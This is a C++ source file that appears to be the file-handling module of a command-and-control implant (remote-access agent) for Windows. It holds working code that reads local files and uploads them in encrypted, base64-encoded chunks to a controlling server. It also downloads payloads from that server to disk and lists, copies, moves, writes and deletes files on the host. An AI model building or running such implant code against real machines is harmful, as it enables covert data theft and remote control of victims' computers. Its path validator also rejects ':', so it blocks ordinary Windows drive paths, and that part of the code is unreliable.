#include "file_tasks.h"
#include "../config/config.h"
#include "../utils/encoding.h"
#include "../core/communication.h"

#include <windows.h>
#include <direct.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>

namespace Tasks {
namespace File {

    bool UploadFile(const std::string& taskId, const std::string& filePath, std::string& outputMessage) {
        // Validate input parameters
        if (taskId.empty()) {
            outputMessage = "Invalid task ID provided";
            return false;
        }

        if (!ValidateFilePath(filePath)) {
            outputMessage = "Invalid or unsafe file path: " + filePath;
            return false;
        }

        // Open the file
        FILE* fp = fopen(filePath.c_str(), "rb");
        if (!fp) {
            DWORD error = GetLastError();
            outputMessage = "Failed to open file: " + filePath + " (Error: " + std::to_string(error) + ")";
            return false;
        }

        // Get file details
        fseek(fp, 0, SEEK_END);
        long fileSize = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        if (fileSize < 0) {
            fclose(fp);
            outputMessage = "Failed to determine file size: " + filePath;
            return false;
        }

        // Extract filename from path
        std::string fileName = ExtractFileName(filePath);

        PRINTF("[DEBUG] Starting upload: %s (%ld bytes)\n", fileName.c_str(), fileSize);

        // Create UploadStart request (HT = 4)
        json startData = {
            {"agent_id", Config::Agent::GetId()},
            {"task_id", taskId},
            {"file_name", fileName},
            {"file_size", fileSize},
            {"path", filePath},
            {"content", ""},
        };

        // Base64 encode the startData
        std::string encoded_data = Utils::Encoding::base64_encode(startData.dump());

        // Create outer request structure
        json outerStartData = {
            {"data", encoded_data},
            {"ht", 4}  // UploadStart
        };

        json startResponse;
        if (!Core::Communication::SendEncryptedRequest(outerStartData, startResponse)) {
            outputMessage = "UploadStart failed (HTTP error).";
            fclose(fp);
            return false;
        }

        PRINTF("[DEBUG] UploadStart response: %s\n", startResponse.dump().c_str());

        // Extract file_id from response
        std::string file_id;
        if (startResponse.contains("id")) {
            file_id = startResponse["id"].get<std::string>();
        }
        else {
            outputMessage = "No file ID returned from UploadStart.";
            fclose(fp);
            return false;
        }

        // UploadChunk (HT = 5)
        const size_t CHUNK_SIZE = 4096;
        int chunk_id = 0;
        bool success = true;
        size_t totalBytesRead = 0;

        while (!feof(fp) && success) {
            char buffer[CHUNK_SIZE];
            size_t bytesRead = fread(buffer, 1, CHUNK_SIZE, fp);
            if (bytesRead > 0) {
                totalBytesRead += bytesRead;
                std::string chunkDataStr(buffer, bytesRead);
                std::string encodedChunk = Utils::Encoding::base64_encode(chunkDataStr);

                // Create chunk data
                json chunkData = {
                    {"task_id", taskId},
                    {"chunk_id", chunk_id},
                    {"content", encodedChunk},
                    {"file_id", file_id}
                };

                // Base64 encode the chunkData
                std::string encoded_chunk_data = Utils::Encoding::base64_encode(chunkData.dump());

                // Create outer request structure
                json outerChunkData = {
                    {"data", encoded_chunk_data},
                    {"ht", 5}  // UploadChunk
                };

                json chunkResponse;
                if (!Core::Communication::SendEncryptedRequest(outerChunkData, chunkResponse)) {
                    outputMessage = "UploadChunk failed at chunk " + std::to_string(chunk_id);
                    success = false;
                    break;
                }
                
                PRINTF("[DEBUG] Uploaded chunk %d (%zu bytes)\n", chunk_id, bytesRead);
                chunk_id++;
            }
        }

        fclose(fp);
        if (!success) return false;

        // UploadEnd (HT = 6)
        json endData = {
            {"agent_id", Config::Agent::GetId()},
            {"task_id", taskId},
            {"status", 4},
            {"result", ""},
            {"file_id", file_id}
        };

        // Base64 encode the endData
        std::string encoded_end_data = Utils::Encoding::base64_encode(endData.dump());

        // Create outer request structure
        json outerEndData = {
            {"data", encoded_end_data},
            {"ht", 6}  // UploadEnd
        };

        json endResponse;
        if (!Core::Communication::SendEncryptedRequest(outerEndData, endResponse)) {
            outputMessage = "UploadEnd failed (HTTP error).";
            return false;
        }

        outputMessage = "File uploaded successfully: " + fileName + " (" + std::to_string(totalBytesRead) + " bytes)";
        PRINTF("[DEBUG] Upload completed: %s\n", outputMessage.c_str());
        return true;
    }

    std::string DownloadFilePayload(const json& task) {
        if (!task.contains("file_id") || !task.contains("id")) {
            PRINTF("[ERROR] Invalid download task - missing file_id or id\n");
            return "";
        }

        // Get the file identifier and task ID from the task object
        std::string file_id = task["file_id"].get<std::string>();
        std::string task_id = task["id"].get<std::string>();

        PRINTF("[DEBUG] Starting download: file_id=%s, task_id=%s\n", file_id.c_str(), task_id.c_str());

        // Build the DownloadStart request (ht == 7)
        json requestData = {
            {"agent_id", Config::Agent::GetId()},
            {"task_id", task_id},
            {"file_id", file_id},
            {"ht", 7}  // DownloadStart
        };

        json downloadResponse;
        if (!Core::Communication::SendEncryptedRequest(requestData, downloadResponse)) {
            PRINTF("[ERROR] DownloadStart request failed\n");
            return "";
        }

        std::string payload = "";
        if (downloadResponse.contains("chunk")) {
            // The server sends the chunk data base64-encoded
            std::string chunk_encoded = downloadResponse["chunk"].get<std::string>();
            std::string chunk_data = Utils::Encoding::base64_decode(chunk_encoded);
            payload += chunk_data;
            PRINTF("[DEBUG] Downloaded initial chunk (%zu bytes)\n", chunk_data.size());
        }

        int next_chunk_id = 0;
        if (downloadResponse.contains("next_chunk_id")) {
            next_chunk_id = downloadResponse["next_chunk_id"].get<int>();
        }

        // Retrieve any additional chunks via DownloadChunk (ht == 8)
        int chunkCount = 0;
        while (next_chunk_id != 0) {
            json chunkRequestData = {
                {"file_id", file_id},
                {"chunk_id", next_chunk_id},
                {"ht", 8}
            };

            json chunkDownloadResponse;
            if (!Core::Communication::SendEncryptedRequest(chunkRequestData, chunkDownloadResponse)) {
                PRINTF("[ERROR] DownloadChunk request failed for chunk %d\n", next_chunk_id);
                break;
            }

            if (chunkDownloadResponse.contains("chunk")) {
                std::string chunk_encoded = chunkDownloadResponse["chunk"].get<std::string>();
                std::string chunk_data = Utils::Encoding::base64_decode(chunk_encoded);
                payload += chunk_data;
                PRINTF("[DEBUG] Downloaded chunk %d (%zu bytes)\n", next_chunk_id, chunk_data.size());
            }

            if (chunkDownloadResponse.contains("next_chunk_id")) {
                next_chunk_id = chunkDownloadResponse["next_chunk_id"].get<int>();
            }
            else {
                next_chunk_id = 0;
            }

            chunkCount++;
            if (chunkCount > 1000) { // Safety limit
                PRINTF("[ERROR] Too many chunks, aborting download\n");
                break;
            }
        }

        PRINTF("[DEBUG] Download completed: %zu bytes total\n", payload.size());
        return payload;
    }

    FileResult DownloadFile(const json& task, const std::string& destinationPath) {
        if (!ValidateFilePath(destinationPath)) {
            return FileResult(false, "Invalid or unsafe destination path: " + destinationPath);
        }

        std::string fileData = DownloadFilePayload(task);
        if (fileData.empty()) {
            return FileResult(false, "Failed to download file data from server");
        }

        FILE* fp = fopen(destinationPath.c_str(), "wb");
        if (!fp) {
            DWORD error = GetLastError();
            return FileResult(false, "Failed to create destination file: " + destinationPath + " (Error: " + std::to_string(error) + ")");
        }

        size_t written = fwrite(fileData.data(), 1, fileData.size(), fp);
        fclose(fp);

        if (written != fileData.size()) {
            DeleteFile(destinationPath); // Clean up partial file
            return FileResult(false, "Failed to write complete file data");
        }

        return FileResult(true, "File downloaded successfully to " + destinationPath, written);
    }

    FileInfo GetFileInfo(const std::string& path) {
        FileInfo info;
        info.path = path;
        info.name = ExtractFileName(path);

        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(path.c_str(), &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            info.exists = true;
            info.isDirectory = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
            
            // Calculate file size
            if (!info.isDirectory) {
                LARGE_INTEGER fileSize;
                fileSize.LowPart = findData.nFileSizeLow;
                fileSize.HighPart = findData.nFileSizeHigh;
                info.size = fileSize.QuadPart;
            }
            
            // Convert file time to string
            SYSTEMTIME st;
            if (FileTimeToSystemTime(&findData.ftLastWriteTime, &st)) {
                std::ostringstream oss;
                oss << std::setfill('0') << std::setw(4) << st.wYear << "-"
                    << std::setw(2) << st.wMonth << "-" << std::setw(2) << st.wDay << " "
                    << std::setw(2) << st.wHour << ":" << std::setw(2) << st.wMinute;
                info.lastModified = oss.str();
            }
            
            FindClose(hFind);
        }
        
        return info;
    }

    bool FileExists(const std::string& filePath) {
        DWORD attributes = GetFileAttributesA(filePath.c_str());
        return (attributes != INVALID_FILE_ATTRIBUTES && !(attributes & FILE_ATTRIBUTE_DIRECTORY));
    }

    size_t GetFileSize(const std::string& filePath) {
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(filePath.c_str(), &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            fileSize.LowPart = findData.nFileSizeLow;
            fileSize.HighPart = findData.nFileSizeHigh;
            FindClose(hFind);
            return fileSize.QuadPart;
        }
        
        return 0;
    }

    bool CreateDirectory(const std::string& dirPath) {
        if (dirPath.empty()) return false;
        
        // Check if directory already exists
        DWORD attributes = GetFileAttributesA(dirPath.c_str());
        if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
            return true; // Already exists
        }
        
        // Create directory and any necessary parent directories
        std::string path = dirPath;
        std::replace(path.begin(), path.end(), '/', '\\');
        
        if (CreateDirectoryA(path.c_str(), NULL)) {
            return true;
        }
        
        DWORD error = GetLastError();
        if (error == ERROR_PATH_NOT_FOUND) {
            // Try to create parent directory first
            size_t pos = path.find_last_of('\\');
            if (pos != std::string::npos) {
                std::string parent = path.substr(0, pos);
                if (CreateDirectory(parent)) {
                    return CreateDirectoryA(path.c_str(), NULL) != FALSE;
                }
            }
        }
        
        return false;
    }

    bool DeleteFile(const std::string& filePath) {
        if (!ValidateFilePath(filePath)) {
            return false;
        }
        
        BOOL result = DeleteFileA(filePath.c_str());
        if (result) {
            PRINTF("[DEBUG] Deleted file: %s\n", filePath.c_str());
        }
        else {
            PRINTF("[DEBUG] Failed to delete file: %s (Error: %d)\n", filePath.c_str(), GetLastError());
        }
        
        return result != FALSE;
    }

    FileResult CopyFile(const std::string& sourcePath, const std::string& destPath, bool overwrite) {
        if (!ValidateFilePath(sourcePath) || !ValidateFilePath(destPath)) {
            return FileResult(false, "Invalid source or destination path");
        }
        
        if (!FileExists(sourcePath)) {
            return FileResult(false, "Source file does not exist: " + sourcePath);
        }
        
        BOOL result = CopyFileA(sourcePath.c_str(), destPath.c_str(), overwrite ? FALSE : TRUE);
        if (result) {
            size_t fileSize = GetFileSize(destPath);
            return FileResult(true, "File copied successfully", fileSize);
        }
        else {
            DWORD error = GetLastError();
            return FileResult(false, "Copy failed (Error: " + std::to_string(error) + ")");
        }
    }

    FileResult MoveFile(const std::string& sourcePath, const std::string& destPath) {
        if (!ValidateFilePath(sourcePath) || !ValidateFilePath(destPath)) {
            return FileResult(false, "Invalid source or destination path");
        }
        
        if (!FileExists(sourcePath)) {
            return FileResult(false, "Source file does not exist: " + sourcePath);
        }
        
        BOOL result = MoveFileA(sourcePath.c_str(), destPath.c_str());
        if (result) {
            size_t fileSize = GetFileSize(destPath);
            return FileResult(true, "File moved successfully", fileSize);
        }
        else {
            DWORD error = GetLastError();
            return FileResult(false, "Move failed (Error: " + std::to_string(error) + ")");
        }
    }

    std::vector<FileInfo> ListDirectory(const std::string& dirPath, bool recursive) {
        std::vector<FileInfo> files;
        
        std::string searchPath = dirPath;
        if (searchPath.back() != '\\' && searchPath.back() != '/') {
            searchPath += "\\";
        }
        searchPath += "*";
        
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        
        if (hFind == INVALID_HANDLE_VALUE) {
            return files;
        }
        
        do {
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) {
                continue;
            }
            
            FileInfo info;
            info.name = findData.cFileName;
            info.path = dirPath + "\\" + findData.cFileName;
            info.exists = true;
            info.isDirectory = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
            
            if (!info.isDirectory) {
                LARGE_INTEGER fileSize;
                fileSize.LowPart = findData.nFileSizeLow;
                fileSize.HighPart = findData.nFileSizeHigh;
                info.size = fileSize.QuadPart;
            }
            
            // Convert file time to string
            SYSTEMTIME st;
            if (FileTimeToSystemTime(&findData.ftLastWriteTime, &st)) {
                std::ostringstream oss;
                oss << std::setfill('0') << std::setw(4) << st.wYear << "-"
                    << std::setw(2) << st.wMonth << "-" << std::setw(2) << st.wDay << " "
                    << std::setw(2) << st.wHour << ":" << std::setw(2) << st.wMinute;
                info.lastModified = oss.str();
            }
            
            files.push_back(info);
            
            // Recurse into subdirectories if requested
            if (recursive && info.isDirectory) {
                std::vector<FileInfo> subFiles = ListDirectory(info.path, true);
                files.insert(files.end(), subFiles.begin(), subFiles.end());
            }
            
        } while (FindNextFileA(hFind, &findData));
        
        FindClose(hFind);
        return files;
    }

    std::string GetDirectoryListing(const std::string& dirPath, bool showHidden) {
        std::vector<FileInfo> files = ListDirectory(dirPath, false);
        
        std::ostringstream oss;
        oss << "Directory listing for: " << dirPath << "\n";
        oss << std::setw(20) << "Name" << " " << std::setw(10) << "Size" << " " 
            << std::setw(16) << "Modified" << " " << "Type\n";
        oss << "--------------------------------------------------------\n";
        
        for (const auto& file : files) {
            // Skip hidden files unless requested
            if (!showHidden && !file.name.empty() && file.name[0] == '.') {
                continue;
            }
            
            oss << std::setw(20) << file.name << " ";
            
            if (file.isDirectory) {
                oss << std::setw(10) << "<DIR>" << " ";
            }
            else {
                oss << std::setw(10) << file.size << " ";
            }
            
            oss << std::setw(16) << file.lastModified << " ";
            oss << (file.isDirectory ? "Directory" : "File") << "\n";
        }
        
        oss << "\nTotal items: " << files.size();
        return oss.str();
    }

    std::string ExtractFileName(const std::string& fullPath) {
        size_t pos = fullPath.find_last_of("\\/");
        return (pos != std::string::npos) ? fullPath.substr(pos + 1) : fullPath;
    }

    std::string ExtractDirectoryPath(const std::string& fullPath) {
        size_t pos = fullPath.find_last_of("\\/");
        return (pos != std::string::npos) ? fullPath.substr(0, pos) : "";
    }

    std::string GetFileExtension(const std::string& filename) {
        size_t pos = filename.find_last_of('.');
        if (pos != std::string::npos && pos > 0) {
            return filename.substr(pos);
        }
        return "";
    }

    bool ValidateFilePath(const std::string& filePath) {
        if (filePath.empty()) {
            return false;
        }
        
        // Check for directory traversal attacks
        if (filePath.find("..") != std::string::npos) {
            PRINTF("[SECURITY] Directory traversal attempt blocked: %s\n", filePath.c_str());
            return false;
        }
        
        // Check for UNC paths (could be used for SMB attacks)
        if (filePath.length() >= 2 && filePath.substr(0, 2) == "\\\\") {
            PRINTF("[SECURITY] UNC path blocked: %s\n", filePath.c_str());
            return false;
        }
        
        // Check for invalid characters
        const std::string invalidChars = "<>:\"|?*";
        for (char c : invalidChars) {
            if (filePath.find(c) != std::string::npos) {
                PRINTF("[SECURITY] Invalid character in path: %s\n", filePath.c_str());
                return false;
            }
        }
        
        return true;
    }

    std::string ReadTextFile(const std::string& filePath, size_t maxSize) {
        if (!ValidateFilePath(filePath) || !FileExists(filePath)) {
            return "";
        }
        
        size_t fileSize = GetFileSize(filePath);
        if (fileSize > maxSize) {
            PRINTF("[WARNING] File too large to read: %zu bytes (max: %zu)\n", fileSize, maxSize);
            return "";
        }
        
        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) {
            return "";
        }
        
        std::string content;
        content.resize(fileSize);
        file.read(&content[0], fileSize);
        file.close();
        
        return content;
    }

    bool WriteTextFile(const std::string& filePath, const std::string& content, bool append) {
        if (!ValidateFilePath(filePath)) {
            return false;
        }
        
        std::ios::openmode mode = std::ios::binary;
        if (append) {
            mode |= std::ios::app;
        }
        
        std::ofstream file(filePath, mode);
        if (!file.is_open()) {
            return false;
        }
        
        file.write(content.data(), content.size());
        file.close();
        
        return file.good();
    }

    uint64_t GetAvailableSpace(const std::string& path) {
        ULARGE_INTEGER freeBytesAvailable;
        if (GetDiskFreeSpaceExA(path.c_str(), &freeBytesAvailable, NULL, NULL)) {
            return freeBytesAvailable.QuadPart;
        }
        return 0;
    }

    std::string GetTempDirectory() {
        char tempPath[MAX_PATH];
        DWORD result = GetTempPathA(MAX_PATH, tempPath);
        if (result > 0 && result < MAX_PATH) {
            return std::string(tempPath);
        }
        return "C:\\Temp\\"; // Fallback
    }

    std::string CreateTempFile(const std::string& prefix, const std::string& extension) {
        std::string tempDir = GetTempDirectory();
        char tempFileName[MAX_PATH];
        
        if (GetTempFileNameA(tempDir.c_str(), prefix.c_str(), 0, tempFileName)) {
            std::string tempPath(tempFileName);
            
            // Replace the default .tmp extension if a different one was requested
            if (extension != ".tmp") {
                size_t pos = tempPath.find_last_of('.');
                if (pos != std::string::npos) {
                    tempPath = tempPath.substr(0, pos) + extension;
                }
            }
            
            return tempPath;
        }
        
        return "";
    }

} // namespace File
} // namespace Tasks